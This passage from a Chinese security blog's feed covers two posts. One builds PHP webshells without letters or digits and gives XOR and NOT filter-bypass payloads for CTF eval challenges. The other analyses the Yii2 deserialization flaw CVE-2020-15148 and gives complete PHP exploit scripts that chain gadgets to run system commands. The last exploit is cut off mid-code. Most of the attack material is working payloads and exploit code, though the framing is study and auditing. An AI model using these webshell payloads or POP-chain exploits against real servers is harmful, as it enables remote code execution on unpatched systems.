&#x2F;&#x2F; A</span><br><span class="line">$__&#x3D;$_;</span><br><span class="line">$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;</span><br><span class="line">$___.&#x3D;$__; &#x2F;&#x2F; S</span><br><span class="line">$__&#x3D;$_;</span><br><span class="line">$__++;$__++;$__++;$__++; &#x2F;&#x2F; E </span><br><span class="line">$___.&#x3D;$__;</span><br><span class="line">$__&#x3D;$_;</span><br><span class="line">$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; &#x2F;&#x2F; R</span><br><span class="line">$___.&#x3D;$__;</span><br><span class="line">$__&#x3D;$_;</span><br><span class="line">$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; &#x2F;&#x2F; T</span><br><span class="line">$___.&#x3D;$__;</span><br><span class="line"></span><br><span class="line">$____&#x3D;&#39;_&#39;;</span><br><span class="line">$__&#x3D;$_;</span><br><span class="line">$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; &#x2F;&#x2F; P</span><br><span class="line">$____.&#x3D;$__;</span><br><span class="line">$__&#x3D;$_;</span><br><span class="line">$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; &#x2F;&#x2F; O</span><br><span class="line">$____.&#x3D;$__;</span><br><span class="line">$__&#x3D;$_;</span><br><span class="line">$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; &#x2F;&#x2F; S</span><br><span class="line">$____.&#x3D;$__;</span><br><span class="line">$__&#x3D;$_;</span><br><span class="line">$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; &#x2F;&#x2F; T</span><br><span class="line">$____.&#x3D;$__;</span><br><span class="line"></span><br><span class="line">$_&#x3D;$$____;</span><br><span class="line">$___($_[_]); &#x2F;&#x2F; ASSERT($_POST[_]);</span><br></pre></td></tr></table></figure><h2 id="0x04-回到最开始的那道题">0x04 回到最开始的那道题</h2><h3 id="异或方法">异或方法</h3><p>前面提到过<code>_GET</code>也可以这样拼接：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$__&#x3D;&quot;&#96;&#123;&#123;&#123;&quot;^&quot;?&lt;&gt;&#x2F;&quot;; &#x2F;&#x2F; $__&#x3D;&quot;_GET&quot;;</span><br></pre></td></tr></table></figure><p>按照这种方法，可以得到一种payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code&#x3D;$_&#x3D;&quot;&#96;&#123;&#123;&#123;&quot;^&quot;?&lt;&gt;&#x2F;&quot;;$&#123;$_&#125;[_]();&amp;_&#x3D;getFlag</span><br></pre></td></tr></table></figure><p>即<code>$&#123;$_&#125;[_]()</code> = <code>$_GET[_]()</code>，url传入<code>_=getFlag</code></p><blockquote><p>本文的后面解释了<code>$&#123;$_&#125;[_]()</code>中的<code>&#123;&#125;</code>的作用</p></blockquote><p>还有两种更直接的payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?code&#x3D;$_&#x3D;&#39;[[]|@[[&#39;^&#39;&lt;&gt;):,:&lt;&#39;;$_();    &#x2F;&#x2F;$_&#x3D;&#39;getFlag&#39;</span><br><span class="line">?code&#x3D;$啊&#x3D;(%27%5D%40%5C%60%40%40%5D%27^%27%3A%25%28%26%2C%21%3A%27);$啊();</span><br></pre></td></tr></table></figure><p>相当于 <code>$啊=getFlag;$啊();</code></p><h3 id="取反方法">取反方法</h3><p>前面也提到过<code>$_GET</code>还有一种简短的写法<code>$&#123;~&quot;\xa0\xb8\xba\xab&quot;&#125;</code></p><p>那么利用这种方式可得payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code&#x3D;$_&#x3D;~%98%9A%8B%B9%93%9E%98;$_(); &#x2F;&#x2F;%_为getFlag取反然后URL编码得结果</span><br></pre></td></tr></table></figure><p>或</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code&#x3D;%24%7B%7E%22%A0%B8%BA%AB%22%7D%5B%AA%5D%28%29%3B&amp;%aa&#x3D;getFlag</span><br></pre></td></tr></table></figure><p>其中：<code>%24%7B%7E%22%A0%B8%BA%AB%22%7D%5B%AA%5D%28%29%3B</code> = <code>$_GET['+']</code></p><h2 id="0x05-进一步思考">0x05 进一步思考</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">include &#39;flag.php&#39;;</span><br><span class="line"></span><br><span class="line">if(isset($_GET[&#39;code&#39;]))&#123;</span><br><span class="line">    $code &#x3D; $_GET[&#39;code&#39;];</span><br><span class="line">    if(strlen($code)&gt;50)&#123;</span><br><span class="line">        die(&quot;Too Long.&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    if(preg_match(&quot;&#x2F;[A-Za-z0-9_]+&#x2F;&quot;,$code))&#123;</span><br><span class="line">        die(&quot;Not Allowed.&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    @eval($code);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line">&#x2F;&#x2F;$hint &#x3D;  &quot;php function getFlag() to get flag&quot;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>在上面一道题的基础上，又过滤了下划线<code>_</code>，意味着不能定义变量，而且也构造不出来数字。</p><p>首先看一个错误的payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code&#x3D;(&#39;$&#39;).(&quot;&#96;&#123;&#123;&#123;&quot;^&quot;?&lt;&gt;&#x2F;&quot;).([&#39;+&#39;])&amp;+&#x3D;getFlag();</span><br></pre></td></tr></table></figure><p>错误的原因是<strong>eval只能解析一遍代码，所以如果写的是a.b这样的字符串拼接，就只会执行这个拼接，并不会去执行代码</strong>。</p><p>例如：</p><p><code>eval($_GET['b'])</code> url里面 <code>b=phpinfo();</code> 这时候相当于<code>eval('phpinfo();')</code><br><code>eval($_GET['b'])</code> url里面<code>b=$_GET[c]&amp;c=phpinfo();</code> 相当于<code>eval('$_GET[c]')</code><br>上面的payload是<code>code=$_GET['+']&amp;+=getFlag();</code> ，也就是<code>eval('$_GET['+'])</code>并不会执行<code>getFlag();</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getflag</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;12354&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">$a=<span class="string">&quot;getflag&quot;</span>;</span><br><span class="line">$b=<span class="string">&quot;()&quot;</span>;</span><br><span class="line">@<span class="keyword">eval</span>($a.$b);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>这个代码不会输出任何结果。</p><p>正确的payload为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code&#x3D;$&#123;&quot;&#96;&#123;&#123;&#123;&quot;^&quot;?&lt;&gt;&#x2F;&quot;&#125;[&#39;+&#39;]();&amp;+&#x3D;getFlag</span><br></pre></td></tr></table></figure><p>这里利用了<code>$&#123;&#125;</code>中的代码是可以执行的特点，其实也就是可变变量。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    $a &#x3D; &#39;hello&#39;;</span><br><span class="line">    $$a &#x3D; &#39;world&#39;;</span><br><span class="line">    echo &quot;$a $&#123;$a&#125;&quot;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>输出<code>hello world</code>，<code>$&#123;$a&#125;</code>，括号中的<code>$a</code>是可以执行的，变成了hello。</p><blockquote><p>这也解释上面提到的为什么要加上<code>&#123;&#125;</code></p></blockquote><p>还可以使用取反的方法：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code&#x3D;%24%7B%7E%22%A0%B8%BA%AB%22%7D%5B%AA%5D%28%29%3B&amp;%aa&#x3D;getFlag</span><br></pre></td></tr></table></figure><p>其中<code>24%7B%7E%22%A0%B8%BA%AB%22%7D%5B%AA%5D%28%29%3B</code> = <code>$&#123;~&quot;\xa0\xb8\xba\xab&quot;&#125;</code> = <code>$_GET</code></p><blockquote><p>~在{}中执行了取反操作</p></blockquote><p>另外上面提到过的一个payload仍然还是可以使用：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">code&#x3D;$啊&#x3D;(%27%5D%40%5C%60%40%40%5D%27^%27%3A%25%28%26%2C%21%3A%27);$啊();</span><br></pre></td></tr></table></figure><p>这里就不需要用{}了，因为异或的值直接被当作字符串赋值给了$啊。</p><h2 id="0x06-最后的思考">0x06 最后的思考</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">include &#39;flag.php&#39;;</span><br><span class="line">if(isset($_GET[&#39;code&#39;]))</span><br><span class="line">&#123;</span><br><span class="line">    $code&#x3D;$_GET[&#39;code&#39;];</span><br><span class="line">    if(strlen($code)&gt;35)&#123;</span><br><span class="line">    die(&quot;Long.&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    if(preg_match(&quot;&#x2F;[A-Za-z0-9_$]+&#x2F;&quot;,$code))</span><br><span class="line">    &#123;</span><br><span class="line">        die(&quot;NO.&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    @eval($code);</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line">&#x2F;&#x2F;$hint&#x3D;&quot;php function getFlag() to get flag&quot;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>这道题进一步的过滤了<code>$</code>字符。</p><p>Payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">code&#x3D;?&gt;&lt;?&#x3D;&#96;&#x2F;???&#x2F;??? ????.???&#96;?&gt;</span><br></pre></td></tr></table></figure><blockquote><p>前提是在Linux系统中</p></blockquote><p>首先<code>?&gt;</code>闭合php文件开头的<code>&lt;?php</code>，<code>&lt;?=</code>可以输出。</p><p><code>&lt;? ?&gt;</code>是短标签，<code>&lt;?php ?&gt;</code>是长标签。在php的配置文件<code>php.ini</code>中有一个<code>short_open_tag</code>的值，开启以后可以使用PHP的短标签：<code>&lt;? ?&gt;</code>同时，只有开启这个才可以使用 <code>&lt;?=&gt;</code>以代替 <code>&lt;? echo</code> 。</p><p>另外，在linux系统中，是支持正则的，某些你忘记某个字符情况下，你可以使用<code>? * %</code>等字符来替代，当然这里想要执行命令，需要极限的利用这个方法，经过测试：</p><p><code>/???/???</code>通配``/bin/cat<code>，</code>???.???<code>通配</code>flag.php`</p><h2 id="0x07-Reference">0x07 Reference</h2><p><a href="https://www.moonback.xyz/2019/10/16/nowords-webshell/">https://www.moonback.xyz/2019/10/16/nowords-webshell/</a></p><h2 id="0x08-Update">0x08 Update</h2><p><a href="https://guokeya.github.io/post/NIupiXpsi/">https://guokeya.github.io/post/NIupiXpsi/</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;PHP无数字字母构造webshell&quot;&gt;PHP无数字字母构造webshell&lt;/h1&gt;
&lt;h2 id=&quot;0x01-从一道题目出发&quot;&gt;0x01 从一道题目出发&lt;/h2&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td c
      
    
    </summary>
    
    
      <category term="web安全" scheme="http://ca0y1h.top/categories/web%E5%AE%89%E5%85%A8/"/>
    
      <category term="基础学习" scheme="http://ca0y1h.top/categories/web%E5%AE%89%E5%85%A8/%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0/"/>
    
    
      <category term="web安全基础" scheme="http://ca0y1h.top/tags/web%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/"/>
    
      <category term="PHP" scheme="http://ca0y1h.top/tags/PHP/"/>
    
  </entry>
  
  <entry>
    <title>Yii2反序列化漏洞分析及拓展</title>
    <link href="http://ca0y1h.top/code_audit/8.Yii2%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%8F%8A%E6%8B%93%E5%B1%95/"/>
    <id>http://ca0y1h.top/code_audit/8.Yii2%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%8F%8A%E6%8B%93%E5%B1%95/</id>
    <published>2020-10-08T15:15:40.000Z</published>
    <updated>2020-10-08T15:20:01.868Z</updated>
    
    <content type="html"><![CDATA[<h1 id="CVE-2020-15148-Yii2-反序列化分析及拓展">CVE-2020-15148 Yii2 反序列化分析及拓展</h1><h2 id="漏洞范围">漏洞范围</h2><ul><li>Yii2 &lt; 2.0.38</li></ul><h2 id="环境安装">环境安装</h2><p>这里直接选择去GitHub官方仓库拉取Yii2的源代码：</p><p><a href="https://github.com/yiisoft/yii2/releases">https://github.com/yiisoft/yii2/releases</a></p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201006210340.png" alt=""></p><p>下载到本地后解压到web目录，修改<code>config/web.php</code>文件里<code>cookieValidationKey</code>的值</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201006210528.png" alt=""></p><p>再在Controller添加一个反序列化的入口代码：</p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201006210912.png" style="zoom:50%;" /><p>MacOS下用MAMP搭建PHP调试环境，测试一下：</p><blockquote><p>搭建教程：<a href="https://www.sqlsec.com/2020/07/macphp.html">https://www.sqlsec.com/2020/07/macphp.html</a></p></blockquote><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201006211613.png" alt=""></p><p>验证成功，开始审计。</p><h2 id="漏洞分析">漏洞分析</h2><p>根据现有的资料，反序列化的起点是在<code>yii\db\BatchQueryResult</code>类中，文件位置<code>/vendor/yiisoft/yii2/db/BatchQueryResult.php</code>：</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201007211913.png" alt=""></p><p><code>__destruct()</code>函数调用了<code>reset()</code>方法，<code>reset()</code>方法中的<code>_dataReader</code>参数是可控的，并且调用了该参数的<code>close()</code>函数，那么此处就可以作为跳板，去执行其他类中的<code>__call()</code>函数，全局查找关键字<code>function __call</code>：</p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201007224238.png" style="zoom:50%;" /><p>一共有找到16个<code>__call()</code>函数，那就一个一个的分析下来，其中Codeception组件中多数是直接抛出异常，没有可利用的地方，但是<code>Faker\Generator</code>类是可以成为POP链的。具体代码位于：<code>/vendor/fzaninotto/faker/src/Faker/Generator.php</code></p><p>首先<code>__call()</code>函数中调用了<code>format()</code>方法：</p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201007224606.png" style="zoom:50%;" /><p>接着跟下去<code>format()</code>方法，参数<code>$method</code>和<code>$attributes</code>都是不可控的：</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201007224816.png" alt=""></p><p>在<code>format()</code>方法内部，使用回调函数<code>call_user_func_array()</code>调用了<code>getFormatter()</code>方法。在该方法中，我们只关心第一个if语句，</p><p>由于<code>$this-&gt;formatter</code>是我们可控的，所以这里就可以调用任意类中的任意方法了。但是上面提到过，此时<code>$formatter='close'</code>而<code>$arguments</code>为空，也就是说<code>call_user_func_array()</code>这个函数的第一个参数可控，第二个参数为空。说的更透彻一点，要寻找的就是可以实现RCE的任意一个方法，并且参数是类的成员变量！</p><p>同样的，这里我们用<code>call_user_func()</code>去实现RCE，用正则表达式<code>call_user_func(\$this-&gt;([a-zA-Z0-9]+), \$this-&gt;([a-zA-Z0-9]+)\)</code>去匹配参数的限制，全局搜索：</p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201007231112.png" style="zoom:50%;" /><p><code>yii\rest\CreateAction::run()</code>和<code>yii\rest\IndexAction::run()</code>都可以实现上述条件下的RCE：</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201007231243.png" alt=""></p><p>那么整个POP链也就清楚了：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">yii\db\BatchQueryResult::__destruct()</span><br><span class="line">-&gt;</span><br><span class="line">Faker\Generator::__call()</span><br><span class="line">-&gt;</span><br><span class="line">yii\rest\CreateAction::run()</span><br></pre></td></tr></table></figure><h2 id="编写EXP">编写EXP</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">yii</span>\<span class="title">rest</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">CreateAction</span>&#123;</span><br><span class="line">        <span class="title">public</span> $<span class="title">id</span>;</span><br><span class="line">        <span class="keyword">public</span> $checkAccess;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;id = <span class="string">&#x27;whoami&#x27;</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;checkAccess = <span class="string">&#x27;system&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Faker</span>&#123;</span><br><span class="line">    <span class="title">use</span> <span class="title">yii</span>\<span class="title">rest</span>\<span class="title">CreateAction</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Generator</span></span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> $formatters;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;formatters[<span class="string">&#x27;close&#x27;</span>] = [<span class="keyword">new</span> CreateAction(), <span class="string">&#x27;run&#x27;</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">yii</span>\<span class="title">db</span>&#123;</span><br><span class="line">    <span class="title">use</span> <span class="title">Faker</span>\<span class="title">Generator</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">BatchQueryResult</span></span>&#123;</span><br><span class="line">        <span class="keyword">private</span> $_dataReader;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;_dataReader = <span class="keyword">new</span> <span class="built_in">Generator</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> &#123;</span><br><span class="line">    <span class="title">use</span> <span class="title">yii</span>\<span class="title">db</span>\<span class="title">BatchQueryResult</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> base64_encode(serialize(<span class="keyword">new</span> BatchQueryResult()));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>结果：</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201007233404.png" alt=""></p><h2 id="继续挖掘">继续挖掘</h2><p>新版本的<code>BatchQueryResult</code>类已经无法反序列化了，那就全局搜索<code>__destruct()</code>函数，然后一个个的排查。</p><h3 id="第一条POP链">第一条POP链</h3><p>触发点位于<code>vendor\codeception\codeception\ext\RunProcess.php</code>，POP链如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Codeception\Extension\RunProcess::__destruct()</span><br><span class="line">-&gt;</span><br><span class="line">Faker\Generator::__call()</span><br><span class="line">-&gt;</span><br><span class="line">yii\rest\IndexAction::run()</span><br></pre></td></tr></table></figure><p>EXP：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">yii</span>\<span class="title">rest</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">CreateAction</span>&#123;</span><br><span class="line">        <span class="title">public</span> $<span class="title">id</span>;</span><br><span class="line">        <span class="keyword">public</span> $checkAccess;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;id = <span class="string">&#x27;whoami&#x27;</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;checkAccess = <span class="string">&#x27;system&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Faker</span>&#123;</span><br><span class="line">    <span class="title">use</span> <span class="title">yii</span>\<span class="title">rest</span>\<span class="title">CreateAction</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Generator</span></span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> $formatters;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;formatters[<span class="string">&#x27;isRunning&#x27;</span>] = [<span class="keyword">new</span> CreateAction(), <span class="string">&#x27;run&#x27;</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Codeception</span>\<span class="title">Extension</span>&#123;</span><br><span class="line">    <span class="title">use</span> <span class="title">Faker</span>\<span class="title">Generator</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">RunProcess</span></span>&#123;</span><br><span class="line">        <span class="keyword">private</span> $process;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;process = [<span class="keyword">new</span> <span class="built_in">Generator</span>()];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> &#123;</span><br><span class="line">    <span class="title">echo</span> <span class="title">base64_encode</span>(<span class="title">serialize</span>(<span class="title">new</span> <span class="title">Codeception</span>\<span class="title">Extension</span>\<span class="title">RunProcess</span>()));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="第二条POP链">第二条POP链</h3><p>触发点位于<code>vendor\swiftmailer\lib\classes\Swift\KeyCache\DiskKeyCache.php</code>，POP链如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Swift\KeyCache\DiskKeyCache::__destruct()</span><br><span class="line">-&gt;</span><br><span class="line">src\DocBlock\Tags\Deprecated.php::__toString()</span><br><span class="line">-&gt;</span><br><span class="line">Faker\Generator::__call()</span><br><span class="line">-&gt;</span><br><span class="line">yii\rest\IndexAction::run()</span><br></pre></td></tr></table></figure><p>EXP：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span 